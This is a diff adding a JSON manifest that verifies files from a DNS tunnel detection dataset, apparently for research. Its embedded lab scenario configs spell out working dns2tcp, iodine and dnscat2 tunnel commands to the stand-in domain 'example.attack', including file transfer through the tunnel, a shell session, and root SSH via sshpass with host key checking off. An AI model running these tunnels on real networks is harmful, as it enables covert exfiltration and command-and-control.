@@ -1,0 +1,125 @@
+[
+  {
+    "path": "dns_tunnel_c2/10194c4889fb8a4d18459e1722ce6677/.metadata",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/dns_tunnel_c2/10194c4889fb8a4d18459e1722ce6677/.metadata",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-0.txt",
+    "sha256": "f2e13b9419fd53ae80ac87b4b356f940e1bbb95fae3fdb6f9473f7f5238132e9",
+    "publisher_git_blob_sha1": "5afb114a5ef9ba85a834502844ae9b564d1cf48c",
+    "capture_command_lines": [
+      "scenario: {\"name\": \"DNS Tunnel Scenario\", \"description\": \"\\\"This Scenario runs through multiple DNS tunneling \\\"\\n\", \"provisioner\": \"vagrant\", \"use_default_templates\": true, \"components\": [{\"name\": \"COREDNS\", \"ipv4_address\": \"192.168.0.10\", \"description\": \"Installation of CoreDNS server.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"ansible\", \"val\": \"coredns_playbook\"}, \"run\": {\"type\": \"shell\", \"val\": \"sudo systemctl stop systemd-resolved; sudo /opt/coredns/coredns -conf /opt/coredns/Corefile > /tmp/coredns.log 2>&1 & sleep 1;\"}, \"artifacts_to_collect\": [{\"type\": \"pcap\", \"val\": [\"tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53\"]}, {\"type\": \"files\", \"val\": [\"/tmp/coredns.log\", \"/tmp/filebeat.json*\", \"/tmp/dns.pcap\"]}, {\"type\": \"filebeat\", \"val\": [\"/tmp/coredns.log\"]}]}, {\"name\": \"dns2tcp_server\", \"ipv4_address\": \"192.168.0.20\", \"description\": \"This sets up the DNS2TCP server.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"ansible\", \"val\": \"dns2tcp_server_setup\"}, \"run\": {\"type\": \"shell\", \"val\": \"sudo apt install -y socat;\\n#nohup asciinema rec /tmp/dns2tcp_server_KEY.cast -c \\\\'set -x; dns2tcpd -d 1 -f /opt/dns2tcpdrc & sleep 1\\\\'\"}, \"artifacts_to_collect\": [{\"type\": \"files\", \"val\": [\"/tmp/*.cast\"]}]}, {\"name\": \"dns2tcp_client\", \"ipv4_address\": \"192.168.0.30\", \"description\": \"This sets up the DNS2TCP client.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"shell\", \"val\": \"sudo apt-get install -y dns2tcp sshpass asciinema;\"}, \"run\": {\"type\": \"shell\", \"val\": \"set -x; dns2tcpc -z example.attack -k 0xDEADBEEF 192.168.0.10 -r ssh -l 12345  -T KEY & sleep 1; rsync -P --rsh=\\\"sshpass -p root ssh -l root -oStrictHostKeyChecking=no -p 12345\\\" 127.0.0.1:/root/test-file /tmp/\"}, \"artifacts_to_collect\": [{\"type\": \"files\", \"val\": [\"/tmp/*.cast\"]}, {\"type\": \"cli_recording\", \"val\": [\"/tmp/dns2tcp_client_KEY_noncompressed_0xDEADBEEF.cast\"]}], \"depends_on\": [\"dns_attack_server\", \"dns_server\"]}]}"
+    ],
+    "execution_time": [
+      "execution_time: 2022-04-01 17:17:04.793066"
+    ]
+  },
+  {
+    "path": "dns_tunnel_c2/16985c987adf046c5af25fa918803186/.metadata",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/dns_tunnel_c2/16985c987adf046c5af25fa918803186/.metadata",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-1.txt",
+    "sha256": "056f4b533a579459075739f2f3b2af068751c4aaf84089facd7593c3bf44b44b",
+    "publisher_git_blob_sha1": "472899159be30b9e852e0426f7a8c6a44ccab789",
+    "capture_command_lines": [
+      "scenario: {\"name\": \"DNS Tunnel Scenario\", \"description\": \"\\\"This Scenario runs through multiple DNS tunneling \\\"\\n\", \"provisioner\": \"vagrant\", \"use_default_templates\": true, \"components\": [{\"name\": \"COREDNS\", \"ipv4_address\": \"192.168.0.10\", \"description\": \"Installation of CoreDNS server.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"ansible\", \"val\": \"coredns_playbook\"}, \"run\": {\"type\": \"shell\", \"val\": \"sudo systemctl stop systemd-resolved; sudo /opt/coredns/coredns -conf /opt/coredns/Corefile > /tmp/coredns.log 2>&1 & sleep 1;\"}, \"artifacts_to_collect\": [{\"type\": \"pcap\", \"val\": [\"tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53\"]}, {\"type\": \"files\", \"val\": [\"/tmp/coredns.log\", \"/tmp/filebeat.json*\", \"/tmp/dns.pcap\"]}, {\"type\": \"filebeat\", \"val\": [\"/tmp/coredns.log\"]}]}, {\"name\": \"dnscat_server\", \"ipv4_address\": \"192.168.0.20\", \"description\": \"This sets up the DNSCat2 server.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"shell\", \"val\": \"sudo apt install -y ruby ruby-dev asciinema libtext-lorem-perl; git clone https://github.com/iagox86/dnscat2.git; cd dnscat2/server/; sudo gem install bundler; sudo bundle install; sudo lorem -p 1000 > /root/test-file;\"}, \"run\": {\"type\": \"shell\", \"val\": \"echo \\\"This will be run interactively\\\"; #vagrant ssh dnscat_server; #asciinema rec /tmp/dnscat_server.cast; #ruby ./dnscat2/server/dnscat2.rb example.attack --secret 1234; #window -i 1; #shell; #ctrl-z; #window -i 2; #whoami; #pwd; #ps aux; #w; #env; #ctrl-z; #window -i 1; #upload /tmp/test-file /tmp/test-file;\"}, \"artifacts_to_collect\": [{\"type\": \"files\", \"val\": [\"/tmp/*.cast\"]}]}, {\"name\": \"dnscat_client\", \"ipv4_address\": \"192.168.0.30\", \"description\": \"This sets up the DNSCat2 client.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"shell\", \"val\": \"sudo apt-get install -y asciinema; git clone https://github.com/iagox86/dnscat2.git; cd dnscat2/client/; make;\"}, \"run\": {\"type\": \"shell\", \"val\": \"echo \\\"This will be run interactively\\\"; #vagrant ssh dnscat_client; #asciinema rec /tmp/dnscat_client.cast; #./dnscat2/client/dnscat --dns server=192.168.0.10,domain=example.attack --secret=1234; #exit;\"}, \"artifacts_to_collect\": [{\"type\": \"files\", \"val\": [\"/tmp/*.cast\"]}], \"depends_on\": [\"dns_attack_server\", \"dns_server\"]}]}"
+    ],
+    "execution_time": [
+      "execution_time: 2022-04-01 15:14:52.807639"
+    ]
+  },
+  {
+    "path": "dns_tunnel_file_transfer/03bb49505f204e73deae1f011d2af759/.metadata",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/dns_tunnel_file_transfer/03bb49505f204e73deae1f011d2af759/.metadata",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-2.txt",
+    "sha256": "8195958c49e4dbfb0b6a2d7e7ab418bffac076e4ece64bf9985b4c3adb2e082c",
+    "publisher_git_blob_sha1": "98a12ad2865f90409cb6a3434f38f20e94f1b554",
+    "capture_command_lines": [
+      "scenario: {\"name\": \"DNS Tunnel Scenario\", \"description\": \"\\\"This Scenario runs through multiple DNS tunneling \\\"\\n\", \"provisioner\": \"vagrant\", \"use_default_templates\": true, \"components\": [{\"name\": \"DNSMASQ\", \"ipv4_address\": \"192.168.0.10\", \"description\": \"Installation of DNSMASQ DNS server.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"script\", \"val\": \"dnsmasq.bash\"}, \"run\": {\"type\": \"shell\", \"val\": \"systemctl stop systemd-resolved; systemctl restart dnsmasq;\"}, \"artifacts_to_collect\": [{\"type\": \"pcap\", \"val\": [\"tcpdump -i any -n -t -w /tmp/dns.pcap port 53\"]}, {\"type\": \"files\", \"val\": [\"/var/log/dnsmasq.log\", \"/tmp/dns.pcap\", \"/tmp/filebeat.json*\"]}, {\"type\": \"filebeat\", \"val\": [\"/var/log/dnsmasq.log\"]}]}, {\"name\": \"iodine_server\", \"ipv4_address\": \"192.168.0.20\", \"description\": \"This sets up the IODINE server.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"ansible\", \"val\": \"iodine_server_setup\"}, \"run\": {\"type\": \"shell\", \"val\": \"nohup asciinema rec /tmp/iodine_server_cname_base32_0xDEADBEEF.cast -c \\\\'set -x; iodined -4 -c -f 10.0.0.1 example.attack -P 0xDEADBEEF & sleep 1\\\\'\"}, \"artifacts_to_collect\": [{\"type\": \"files\", \"val\": [\"/tmp/*.cast\"]}]}, {\"name\": \"iodine_client\", \"ipv4_address\": \"192.168.0.30\", \"description\": \"This sets up the IODINE client.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"script\", \"val\": \"iodine_client_setup.bash\"}, \"run\": {\"type\": \"shell\", \"val\": \"set -x; (iodine -4 -f -P 0xDEADBEEF -Tcname -Obase32 -r 192.168.0.10 example.attack) & sleep 20; rsync -P --rsh=\\\"sshpass -p root ssh -l root -oStrictHostKeyChecking=no\\\" 10.0.0.1:/root/test-file /tmp/\"}, \"artifacts_to_collect\": [{\"type\": \"files\", \"val\": [\"/tmp/*.cast\"]}, {\"type\": \"cli_recording\", \"val\": [\"/tmp/iodine_client_cname_base32_0xDEADBEEF.cast\"]}], \"depends_on\": [\"dns_attack_server\", \"dns_server\"]}]}"
+    ],
+    "execution_time": [
+      "execution_time: 2022-03-31 17:12:45.727009"
+    ]
+  },
+  {
+    "path": "dns_tunnel_file_transfer/0455ce50cb935a6dbfc73182674c9e5f/.metadata",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/dns_tunnel_file_transfer/0455ce50cb935a6dbfc73182674c9e5f/.metadata",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-3.txt",
+    "sha256": "7a63eb3ca0e673a4a34c877d5d2143cee7387f1dda0c93988ac355d9fc40c5f2",
+    "publisher_git_blob_sha1": "f5c92ea90fc1b34c39110d38329a41f8a37e0be1",
+    "capture_command_lines": [
+      "scenario: {\"name\": \"DNS Tunnel Scenario\", \"description\": \"\\\"This Scenario runs through multiple DNS tunneling \\\"\\n\", \"provisioner\": \"vagrant\", \"use_default_templates\": true, \"components\": [{\"name\": \"BIND9\", \"ipv4_address\": \"192.168.0.10\", \"description\": \"Installation of BIND9 DNS server.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"ansible\", \"val\": \"bind9_playbook\"}, \"run\": {\"type\": \"shell\", \"val\": \"systemctl restart named\"}, \"artifacts_to_collect\": [{\"type\": \"pcap\", \"val\": [\"tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53\"]}, {\"type\": \"files\", \"val\": [\"/var/cache/bind/query*.log\", \"/tmp/filebeat.json*\", \"/tmp/dns.pcap\"]}, {\"type\": \"elastic\", \"val\": [\"192.168.1.248:9200\"]}, {\"type\": \"filebeat\", \"val\": [\"/var/cache/bind/query*.log\"]}]}, {\"name\": \"iodine_server\", \"ipv4_address\": \"192.168.0.20\", \"description\": \"This sets up the IODINE server.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"ansible\", \"val\": \"iodine_server_setup\"}, \"run\": {\"type\": \"shell\", \"val\": \"nohup asciinema rec /tmp/iodine_server_null_base128_0xDEADBEEF.cast -c \\\\'set -x; iodined -4 -c -f 10.0.0.1 example.attack -P 0xDEADBEEF & sleep 1\\\\'\"}, \"artifacts_to_collect\": [{\"type\": \"files\", \"val\": [\"/tmp/*.cast\"]}]}, {\"name\": \"iodine_client\", \"ipv4_address\": \"192.168.0.30\", \"description\": \"This sets up the IODINE client.\", \"image\": \"ubuntu/focal64\", \"setup\": {\"type\": \"script\", \"val\": \"iodine_client_setup.bash\"}, \"run\": {\"type\": \"shell\", \"val\": \"set -x; (iodine -4 -f -P 0xDEADBEEF -Tnull -Obase128 -r 192.168.0.10 example.attack) & sleep 20; rsync -P --rsh=\\\"sshpass -p root ssh -l root -oStrictHostKeyChecking=no\\\" 10.0.0.1:/root/test-file /tmp/\"}, \"artifacts_to_collect\": [{\"type\": \"files\", \"val\": [\"/tmp/*.cast\"]}, {\"type\": \"cli_recording\", \"val\": [\"/tmp/iodine_client_null_base128_0xDEADBEEF.cast\"]}], \"depends_on\": [\"dns_attack_server\", \"dns_server\"]}]}"
+    ],
+    "execution_time": [
+      "execution_time: 2022-03-30 14:20:34.175137"
+    ]
+  },
+  {
+    "path": "README.md",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/README.md",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-4.txt",
+    "sha256": "c5fa6d67ddcbcb18e64879e95a17cc8af373a5d029659c7cae05ee53458450d1",
+    "publisher_git_blob_sha1": "cf344a9e3cc943a2371f1dc66009a00c2e36a613",
+    "capture_command_lines": [],
+    "execution_time": []
+  },
+  {
+    "path": "scenario/dns_tunnel/README.md",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/scenario/dns_tunnel/README.md",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-5.txt",
+    "sha256": "00253be0afd22e34495d4486be536a9b99342c65dc6fcc834388c8a78c0d65b1",
+    "publisher_git_blob_sha1": "1b42509d99a9e786fbb7a9fcc7fc278eb597797d",
+    "capture_command_lines": [],
+    "execution_time": []
+  },
+  {
+    "path": "dns_tunnel_c2/README.md",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/dns_tunnel_c2/README.md",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-6.txt",
+    "sha256": "a8ed34f58b77f156b60292afeac686e21d49904063082bb9ad3e7d8d69e07d80",
+    "publisher_git_blob_sha1": "63d9996edb23a09160386cef7784b91e7afc676e",
+    "capture_command_lines": [],
+    "execution_time": []
+  },
+  {
+    "path": "scenario/dns_tunnel/dns_server/bind9.yaml",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/scenario/dns_tunnel/dns_server/bind9.yaml",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-7.txt",
+    "sha256": "8c546d618e58676776f73f08ed5e1386780c42adb62c3e7312c6b67fbf4bb595",
+    "publisher_git_blob_sha1": "deb0be81e169adb59015ffa08af7444e16fffade",
+    "capture_command_lines": [
+      "val: [\"tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53\"]"
+    ],
+    "execution_time": []
+  },
+  {
+    "path": "scenario/dns_tunnel/dns_server/coredns.yaml",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/scenario/dns_tunnel/dns_server/coredns.yaml",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-8.txt",
+    "sha256": "ffec3f22ab0b8938afa8e5674f6797b69f6b6b5c76d521f5e0c012dfc90c0cde",
+    "publisher_git_blob_sha1": "3dbb4d03823e0793ee004a8af68586eafccee06a",
+    "capture_command_lines": [
+      "val: [\"tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53\"]"
+    ],
+    "execution_time": []
+  },
+  {
+    "path": "scenario/dns_tunnel/dns_server/dnsmasq.yaml",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/scenario/dns_tunnel/dns_server/dnsmasq.yaml",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-9.txt",
+    "sha256": "87eae495ea136c81739041859a7ed74c244d1f8ccedf00904f5b805dcbe3c0bf",
+    "publisher_git_blob_sha1": "3e75471fd1ec5537a3df898ba5f079f3250bfa6c",
+    "capture_command_lines": [
+      "val: [\"tcpdump -i any -n -t -w /tmp/dns.pcap port 53\"]"
+    ],
+    "execution_time": []
+  },
+  {
+    "path": "scenario/dns_tunnel/dns_server/powerdns.yaml",
+    "url": "https://raw.githubusercontent.com/Korving-F/dns-tunnel-dataset/bdc4486751f5e87fa6100b17dd57fc001743b43c/scenario/dns_tunnel/dns_server/powerdns.yaml",
+    "local": "docs/verification/dns-korving-qualification-20261015/publisher-10.txt",
+    "sha256": "a7eba2cae547caa37d5c07e7b7fa2e3d3479c00d5f8dd094398483e22b2bdf4a",
+    "publisher_git_blob_sha1": "9997e56b2e1bc2d51ceb20bcd885e03345ac2fed",
+    "capture_command_lines": [
+      "val: [\"tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53\"]"
+    ],
+    "execution_time": []
+  }
+]
